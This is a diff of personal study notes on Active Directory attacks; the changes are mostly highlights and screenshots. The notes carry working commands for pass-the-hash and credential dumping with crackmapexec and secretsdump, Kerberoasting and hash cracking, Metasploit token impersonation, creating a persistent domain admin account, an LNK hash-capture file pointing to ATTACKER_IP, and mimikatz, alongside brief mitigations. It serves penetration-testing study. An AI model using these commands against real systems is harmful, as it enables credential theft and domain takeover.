@@ -53,7 +53,7 @@ crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H ha
 
 
 
-One module really useful is `lsassy`, it is used to enforce the security policy on the system and stores some credentials so we could retrieve them:
+One module really useful is `lsassy`, <mark style="background: #BBFABBA6;">it is used to enforce the security policy on the system and stores some credentials so we could retrieve them using this command</mark>:
 ```bash
 crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H hash_value --local-auth -M lsassy
 ```
@@ -65,13 +65,13 @@ crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H ha
 1. execute `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -p Password1`
 	1. ![[Pasted image 20241220104858.png]]
 	2. in case we have only the hash and not the password we need to run `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth`
-2. then we can start to enumerate all information with `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth --sam ` to get other hashes
+2. **==then we can start to enumerate all information with==** `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth --sam ` to get other hashes
 3. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth --shares` to get other info about the the file sharing spaces
 4. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth -lsa` to get secret information
-5. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth -M lsassy` to get all stored information 
+5. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth -M lsassy` **==to get all stored information==** 
 
 
-Crackmapexec stores everything in a database so we can retrieve the information using:
+**==Crackmapexec stores everything in a database so we can retrieve the information using:==**
 ```bash
 cmedb 
 
@@ -81,7 +81,7 @@ help
 
 ## dumbing and cracking hashes
 
-What we can do is to run :
+**==What we can do is to run==** :
 ```bash 
 secretsdump.py DOMAIN/username:'PASSWORD'@IP_HOST
 ```
@@ -91,27 +91,29 @@ secretsdump.py DOMAIN/username:'PASSWORD'@IP_HOST
 
 ## Pass attack mitigation
 It is pretty hard to prevent but we can:
-- force a limit account re-use
+- **==force a limit account re-use==**
 	- ![[Pasted image 20241220114503.png]]
-- Utilize strong passwords
-- use a Privilege Access Management (PAM)
+- **==Utilize strong passwords==**
+- **==use a Privilege Access Management (PAM)==**
 	- ![[Pasted image 20241220114530.png]]
 
 
 
 # Kerberoasting attack
-This attacks leverages on a service account (example SQL Service)
+
+**==This attacks leverages on a service account==** (example SQL Service)
 - ![[Pasted image 20241220114715.png]]
 - here we have an application server, when we have to access to it we need to ask for a ticket to the domain controller (TGT used to get a ticket to contact directly the server)
 - once we have a TGT we need to request a TGS (to the domain controller) that is needed to access to the application server
 
-The TGS is encrypted with the hash of the Application server.
+**==The TGS is encrypted with the hash of the Application server.==**
 - when we contact it the service will decrypt the ticket TGS and see if it is valid
 
-So the idea here is to use the tool GetUserSPN to dump the Service server Hash value (contained in the TGS).
+<mark style="background: #FF5582A6;">So the idea here is to use the tool GetUserSPN to dump the Service server Hash value (contained in the TGS).</mark>
 
 
 **==The attack idea is to use services accounts (SQL Service or IIS) that uses weak passwords.==**
+
 ## Step 1: Dump hash with GET SPNs
 Here we can use 
 ```bash
@@ -119,6 +121,8 @@ sudo pyhton GetUserSPNs.py DOMAIN/username:password -dc-ip IP_OF_DOMAIN_CONTROLL
 ```
 - ![[Pasted image 20241220120512.png]]
 - ![[Pasted image 20241220120819.png]]
+- ![[Pasted image 20250113152111.png]]
+
 
 ## Step 2: crack the hash with hashcat
 We can crack the hash using hashcat:
@@ -130,7 +134,7 @@ hashcat -m 13100 hash.txt rockyout.txt
 
 ## Mitigation
 The idea to mitigate this attack is:
-- use strong passwords
+- **==use strong passwords==**
 - use least privilege (not run the service as domain admin)
 
 
@@ -167,24 +171,29 @@ set smbdomain DOMAIN
 run
 
 ```
+- ![[Pasted image 20250113152414.png]]
 
-Now we have to load the Incognito mode into metasploit:
+
+Now we have to load the `Incognito` mode into metasploit:
 ```bash
 whoami (to see if it worked)
 
 load incognito
 ```
+- ![[Pasted image 20250113152434.png]]
 - to work the user must be logged into the victim host
 - `load + tab ` must show the alternatives
 
-Now we can start to list tokens:
+
+
+**==Now we can start to list tokens (the ones we can impersonate): ==**
 ```bash
 list_tokens -u
 ```
 - `-g` to show groups instead users
 - ![[Pasted image 20241220123122.png]]
 
-At this point we can impersonate the token of a user:
+**==At this point we can impersonate the token of a user:==**
 ```bash
 impersonate_token DOMAIN\\username
 ```
@@ -196,16 +205,17 @@ Now with this we can obtain a shell:
 ```bash
 shell
 ```
+- ![[Pasted image 20250113152551.png]]
 
 
-At this point we can add a new user to the Active Directory system:
+**==At this point we can add a new user to the Active Directory system (MAINTAIN ACCESS) ==**:
 ```bash
 net user /add username Password /domain
 ```
 - `/domain` here must stay domain in lower 
 - ![[Pasted image 20241220123605.png]]
 
-At this point we need to add the new user in the admin group:
+**==At this point we need to add the new user in the admin group:==**
 ```bash
 group "Domain Admins" username /ADD /DOMAIN
 ```
@@ -250,10 +260,10 @@ $lnk.HotKey = "Ctrl+Alt+T"
 $lnk.Save()
 ```
 - we create this `test.lnk` file that tries to resole a `png` file pointing back to our attack machine 
-- the resolving will send us the request with the hashes
+- ==**the resolving will send us the request with the hashes**==
 - this will save the file into `C` drive
 
-So if we have a responder and the file is triggered then we can capture the hashes.
+**==So if we have a responder and the file is triggered then we can capture the hashes.==**
 
 We can rename the file as:
 ```bash
@@ -279,7 +289,7 @@ At this point when the user navigates the file share we will obtain data:
 
 
 ## netexec tool to automatize
-Netexec is an evolution of crackmapexec that can be used to automatize:
+`Netexec` **==is an evolution of crackmapexec that can be used to automatize==**:
 ```bash
 netexec smb VICTIM_IP -d DOMAIN -u username -p Password -M slinky -o NAME=filename SERVER=ATTACKER_IP
 ```
@@ -289,7 +299,7 @@ It will create automatically the file into a file share space:
 
 
 # GPP ATTACK
-This is a older attack and it is done on the Group Policy Preferences that allowed admins to create policies using embendded credentials.
+<mark style="background: #FF5582A6;">This is a older attack and it is done on the Group Policy Preferences that allowed admins to create policies using embendded credentials.</mark>
 
 These credentials were encrypted and placed in a "cPassword".
 - The key was acidentally released
@@ -311,12 +321,12 @@ We can also use ==**metasploit to do this type of attack with the module**== `sm
 **==The idea is to extract XML credentials contianed in clear on the memory.==**
 ## Mitigation
 We can fix it in this way:
-- Use the patch and update
-- delete the old GPP xml file stored in SYSVOL
+- **==Use the patch and update==**
+- **==delete the old GPP xml file stored in SYSVOL==**
 
 
 # Mimikatz attack
-This is a tool generally used to view and steal credentials, to generate Kerberos tickets and to do attacks.
+<mark style="background: #BBFABBA6;">This is a tool generally used to view and steal credentials, to generate Kerberos tickets and to do attacks.</mark>
 
 It can dump credentials stored in memory and can do some attacks like:
 - cred dumping
@@ -337,7 +347,9 @@ First of all we need to get it from github [https://github.com/ParrotSec/mimikat
 We download the release and we go to `x64` folder in it and extract the files:
 - ![[Pasted image 20241220150414.png]]
 
-The idea is that we need to put these files into a machine in the Active Directory system.
+**==The idea is that we need to put these files into a machine in the Active Directory system.==**
+
+<mark style="background: #BBFABBA6;">We need to connect with windows to a user in the domain (the one we cracked).</mark>
 
 On the attacker we can run:
 ```bash
@@ -348,7 +360,7 @@ And then get it from the windows machine:
 - ![[Pasted image 20241220150602.png]]
 
 
-Now on the windows victim we open the command prompt and run it as admin and go in the folder:
+**==Now on the windows victim we open the command prompt and run it as admin and go in the folder:==**
 ```bash
 c:\users\username\folder_file
 
@@ -374,7 +386,7 @@ sekurlsa::
 ```bash
 sekurlsa::logonPasswords
 ```
-- shows all credentials that can be retrieved on the host we are executing it
+- **==shows all credentials that can be retrieved on the host we are executing it==**
 - ![[Pasted image 20241220151254.png]]
 
 
